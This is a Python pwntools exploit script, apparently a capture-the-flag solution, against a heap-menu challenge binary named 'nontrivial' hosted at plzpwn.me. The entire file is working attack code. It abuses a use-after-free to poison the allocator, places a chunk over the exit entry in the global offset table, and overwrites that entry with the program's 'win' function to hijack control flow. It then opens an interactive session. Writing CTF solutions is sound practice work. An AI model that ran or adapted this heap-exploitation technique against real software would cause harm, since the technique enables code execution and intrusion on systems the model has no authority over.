from pwn import *

PROGNAME   = "./nontrivial"
REMOTEIP   = "plzpwn.me"
REMOTEPORT = 9998

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

def allocate():
    p.sendlineafter("Enter your choice, (or press enter to refresh):", "A")
    p.recvuntil("id: ")

    return int(p.recvline())

def free(id):
    p.sendlineafter("Enter your choice, (or press enter to refresh):", "F")
    p.sendlineafter("Enter chunk id:", str(id))

def write(id, data):
    p.sendlineafter("Enter your choice, (or press enter to refresh):", "W")
    p.sendlineafter("Enter chunk id:", str(id))
    p.sendline(data[:16])

def read(id):
    p.sendlineafter("Enter your choice, (or press enter to refresh):", "P")
    p.sendlineafter("Enter chunk id:", str(id))

    return p.recvline()

a = allocate();
free(a)
write(a, p32(elf.got["exit"]))
a = allocate()
b = allocate() # This is exit@got
write(b, p32(elf.symbols["win"]))

p.sendlineafter(":", "Q")

p.interactive()

